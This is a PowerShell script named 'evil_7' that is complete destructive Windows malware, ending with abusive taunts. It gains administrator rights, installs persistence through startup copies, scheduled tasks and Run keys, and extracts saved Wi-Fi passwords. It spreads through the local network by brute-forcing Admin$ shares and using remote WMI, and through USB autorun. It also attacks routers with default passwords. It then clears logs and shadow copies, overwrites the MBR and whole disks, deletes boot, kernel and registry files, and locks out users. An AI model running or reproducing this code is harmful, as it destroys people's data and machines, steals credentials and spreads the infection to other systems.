# evil_7

param([Switch]$Force)
if (-NOT $Force) { exit }
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" -Verb RunAs
    exit
}

function Set-PendingDelete {
    param($Path)
    if (Test-Path $Path) { reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "\??\$Path\0\0" /f 2>$null }
}

function Stop-CriticalDriver {
    param($Driver)
    sc config "$Driver" start= disabled 2>$null
    Set-PendingDelete "C:\Windows\System32\drivers\$Driver.sys"
}

$vmDrivers = @("vmx86","vmmouse","vmusb","vmci","hgfs","vmmemctl","VBoxGuest","VBoxMouse","VBoxSF","VBoxVideo")
foreach ($d in $vmDrivers) { try { sc stop $d 2>$null; sc delete $d 2>$null } catch {} }

for ($i=0;$i -lt (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors;$i++) {
    Start-Job -ScriptBlock { while($true){$a=1..1000000|ForEach-Object{$_*$_} } } | Out-Null
}
for ($i=0;$i -lt 50;$i++) { Start-Process calc.exe -WindowStyle Hidden -EA 0 }
Start-Job -ScriptBlock { while($true){ Get-WmiObject Win32_Processor | Out-Null; Start-Sleep -Milliseconds 50 } } | Out-Null

$paths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1",
    "$env:USERPROFILE\Documents\evil.ps1",
    "C:\Windows\Temp\evil.ps1",
    "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
)
foreach ($p in $paths) { try { Copy-Item $PSCommandPath $p -Force -EA 0 } catch {} }
try { schtasks /create /tn "evil" /tr "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /sc ONLOGON /ru SYSTEM /f 2>$null } catch {}
try { reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v evil /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /f 2>$null } catch {}
try { reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v evil /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /f 2>$null } catch {}
try { reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v evil /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" /f 2>$null } catch {}

$wifiPasswords = @{}
try {
    $profiles = netsh wlan show profiles | Select-String ":" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    foreach ($profile in $profiles) {
        $output = netsh wlan show profile name="$profile" key=clear
        $pass = $output | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if (-NOT $pass) { $pass = $output | Select-String "Ключ содержимого" | ForEach-Object { ($_ -split ":")[1].Trim() } }
        if ($pass -and $pass -ne "Отсутствует") { $wifiPasswords[$profile] = $pass }
    }
} catch {}

$gateway = $null
try { $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -EA 0).NextHop } catch {}
if (-NOT $gateway) { try { $gateway = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.DefaultIPGateway }).DefaultIPGateway[0] } catch {} }
if (-NOT $gateway) { try { $gateway = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }).IPv4DefaultGateway.NextHop } catch {} }

if ($gateway) {
    $routerPasswords = @("", "admin", "password", "1234", "root", "toor", "Admin", "123456", "qwerty", "1111111", "pass", "admin123")
    $routerIPs = @($gateway, "192.168.0.1", "192.168.1.1", "192.168.2.1", "10.0.0.1")
    foreach ($ip in $routerIPs) {
        foreach ($pass in $routerPasswords) {
            try { Invoke-WebRequest -Uri "http://$ip/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
            try { Invoke-WebRequest -Uri "http://$ip/reset" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
            try { Invoke-WebRequest -Uri "http://$ip/userRpm/SysRebootRpm.htm" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
            try { Invoke-WebRequest -Uri "http://$ip/goform/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
            try { Invoke-WebRequest -Uri "http://$ip/goform/setDHCP?enable=0" -Method GET -TimeoutSec 2 -EA 0 } catch {}
            try { Invoke-WebRequest -Uri "http://$ip/goform/setDNS?dns=0.0.0.0" -Method GET -TimeoutSec 2 -EA 0 } catch {}
        }
    }
}

$subnet = $null
try { $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress; $subnet = $ip -replace '\.[0-9]+$', '' } catch {}
if ($subnet) {
    $passwords = @("", "password", "123456", "admin", "123", "qwerty", "abc123", "111111", "123123", "admin123", "root", "toor") + $wifiPasswords.Values
    1..254 | ForEach-Object {
        $target = "$subnet.$_"
        if (Test-Connection -Quiet -Count 1 -TimeOut 1 $target) {
            foreach ($pass in $passwords) {
                try { net use "\\$target\Admin$" /user:"Administrator" "$pass" 2>$null; if ($LASTEXITCODE -eq 0) {
                    Copy-Item -Path $PSCommandPath -Destination "\\$target\Admin$\evil.ps1" -Force -EA 0
                    schtasks /create /s $target /tn "evil" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\evil.ps1 -Force" /sc ONLOGON /ru SYSTEM /f 2>$null
                    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -ExecutionPolicy Bypass -File C:\evil.ps1 -Force" -ComputerName $target -EA 0
                    net use "\\$target\Admin$" /delete 2>$null
                    break
                }} catch {}
            }
        }
    }
}

Get-NetAdapter -IncludeHidden | Where-Object { $_.Name -match "Bluetooth|Mobile|Cellular|WWAN" } | ForEach-Object { Disable-NetAdapter -Name $_.Name -Confirm:$false -Force -EA 0 }

wevtutil cl System 2>$null; wevtutil cl Security 2>$null; wevtutil cl Application 2>$null; wevtutil cl Setup 2>$null
vssadmin delete shadows /all /quiet 2>$null
Get-WmiObject -Class Win32_ShadowCopy | ForEach-Object { $_.Delete() }

$kernelFiles = @("C:\Windows\System32\ntoskrnl.exe","C:\Windows\System32\ntkrnlmp.exe","C:\Windows\System32\winload.exe","C:\Windows\System32\winload.efi","C:\Windows\System32\winresume.exe","C:\Windows\System32\hal.dll")
foreach ($file in $kernelFiles) { Set-PendingDelete $file }
$regHives = @("SYSTEM","SOFTWARE","SAM","SECURITY","DEFAULT")
foreach ($hive in $regHives) { $target = "C:\Windows\System32\config\$hive"; try { $null = [IO.File]::WriteAllBytes($target, [byte[]]::new(10MB)) } catch { Set-PendingDelete $target } }

try { $null = [IO.File]::WriteAllBytes("\\.\PhysicalDrive0", [byte[]]::new(512)) } catch {}
try { for ($s=0;$s -lt 64;$s++) { $null = [IO.File]::WriteAllBytes("\\.\PhysicalDrive0", [byte[]]::new(512)) } } catch {}

Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA 0 | ForEach-Object {
    $name = $_.PSChildName
    if ($name -notmatch "WmiApSrv|Winmgmt|PowerShell|RpcSs|DcomLaunch|PlugPlay") { Set-ItemProperty -Path $_.PSPath -Name Start -Value 4 -EA 0 }
}
$allDrivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi","mountmgr","fvevol","ntfs","refs","tcpip","ndis","mrxsmb","USBSTOR","USBHUB3","USBXHCI","bthport")
foreach ($d in $allDrivers) { Stop-CriticalDriver $d }

$disks = Get-WmiObject Win32_DiskDrive -EA 0
$patterns = @(0x00,0xFF,0x00,0xFF,0x00,0xFF,0xAA,0x92,0x49,0x24,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF)
foreach ($disk in $disks) {
    try { $size = [long]$disk.Size; if ($size -le 0) { continue }
        $path = "\\.\PhysicalDrive$($disk.Index)"; $fs = [IO.File]::OpenWrite($path); $block = New-Object byte[] (10MB)
        foreach ($pattern in $patterns) { for ($i=0;$i -lt $block.Length;$i++) { $block[$i]=$pattern }; $total = [math]::Ceiling($size/10MB); for ($i=0;$i -lt $total -and $i -lt 50000;$i++) { $fs.Write($block,0,$block.Length); if ($i%100 -eq 0) { $fs.Flush() } } }
        $fs.Close()
    } catch {}
}
$diskpartScript = ($disks | ForEach-Object { "select disk $($_.Index)`nclean all`n" }) + "exit"
$diskpartScript | Out-File "$env:USERPROFILE\diskpart.txt" -Force
Start-Process diskpart.exe -Wait -NoNewWindow -ArgumentList "/s `"$env:USERPROFILE\diskpart.txt`"" -EA 0
Get-PSDrive -PSProvider FileSystem -EA 0 | ForEach-Object {
    $root = $_.Root.Replace("\","")
    if ($root -match "^[A-Z]$") { try { $raw="\\.\$root`:"; $fs=[IO.File]::OpenWrite($raw); $zero=New-Object byte[] (100MB); for($i=0;$i -lt 500;$i++){ $fs.Write($zero,0,$zero.Length); if($i%10 -eq 0){$fs.Flush()} }; $fs.Close() } catch {} }
}

$targets = @(
    "C:\Windows\System32\*.dll","C:\Windows\System32\*.exe","C:\Windows\System32\drivers\*.sys",
    "C:\Windows\SysWOW64\*.dll","C:\Windows\SysWOW64\*.exe",
    "C:\Program Files\*.dll","C:\Program Files\*.exe",
    "C:\Program Files (x86)\*.dll","C:\Program Files (x86)\*.exe",
    "C:\Windows\System32\*.mui","C:\Windows\Fonts\*","C:\Windows\Media\*",
    "C:\Windows\Resources\Themes\*"
)
foreach ($pattern in $targets) { Get-ChildItem $pattern -Recurse -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName } }

bcdedit /delete {bootmgr} /f 2>$null; bcdedit /delete {default} /f 2>$null; bcdedit /delete {current} /f 2>$null
try { mountvol Z: /s } catch {}
if (Test-Path "Z:\") { Remove-Item "Z:\EFI\*" -Recurse -Force -EA 0; mountvol Z: /d }
try { Set-FirmwareEnvironmentVariable -Name "BootOrder" -Namespace "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}" -Value ([byte[]]@(0xFF,0xFF,0xFF,0xFF)) -EA 0 } catch {}

Get-NetAdapter | Where-Object { $_.Name -ne "Loopback" } | ForEach-Object { Disable-NetAdapter -Name $_.Name -Confirm:$false -Force -EA 0 }
netsh wlan delete profile * 2>$null
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound 2>$null

try {
    @("USBSTOR","USBHUB3","USBXHCI") | ForEach-Object { reg add "HKLM\SYSTEM\CurrentControlSet\Services\$_" /v Start /t REG_DWORD /d 4 /f 2>$null; Set-PendingDelete "C:\Windows\System32\drivers\$_.sys" }
    Get-PnpDevice -Class USB | Disable-PnpDevice -Confirm:$false -Force -EA 0
} catch {}

try { $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ }); net user Administrator $randomPass 2>$null } catch {}
try { Get-LocalUser | Where-Object { $_.Name -ne "Administrator" -and $_.Name -ne $env:USERNAME } | Remove-LocalUser -Force -EA 0 } catch {}
try { for ($j=1;$j -le 5000;$j++) { $fakeIP = "192.168.1.$j"; arp -s $fakeIP "00-00-00-00-00-00" 2>$null } } catch {}
try { $drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }; foreach ($d in $drives) { $letter = $d.DeviceID; Copy-Item $PSCommandPath "${letter}\evil.ps1" -Force -EA 0; @("[AutoRun]","open=powershell.exe -ExecutionPolicy Bypass -File evil.ps1 -Force","action=Open folder to view files") | Out-File "${letter}\autorun.inf" -Force } } catch {}
try { reagentc /disable 2>$null; Remove-Item "C:\Windows\System32\Recovery\WinRE.wim" -Force -EA 0 } catch {}
try { taskkill /f /fi "status eq running" /im *.* /t 2>$null } catch {}
try { net share * /delete 2>$null } catch {}
try { sc config wuauserv start= disabled; sc stop wuauserv; sc config bits start= disabled; sc stop bits } catch {}
$fillBlock = New-Object byte[] (1024); for ($letter=67; $letter -le 90; $letter++) { $drive = [char]$letter + ":\"; if (Test-Path $drive) { for ($f=0; $f -lt 200000; $f++) { try { [IO.File]::WriteAllBytes("$drive\fill_$f.bin", $fillBlock) } catch { break } } } }

$asciiSkull = @"
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
"@
Write-Host $asciiSkull -ForegroundColor Red
for ($i=0;$i -lt 3;$i++) { [Console]::Beep(666,500); Start-Sleep -Milliseconds 200; [Console]::Beep(1000,500); Start-Sleep -Milliseconds 200 }

Write-Host "ахахах соси хуй лошара" -ForegroundColor Red
Write-Host "suck my ass" -ForegroundColor Red
Write-Host "Вы добровольно запустили этот файл) by. evil" -ForegroundColor White

Set-PendingDelete $PSCommandPath
Stop-Computer -Force
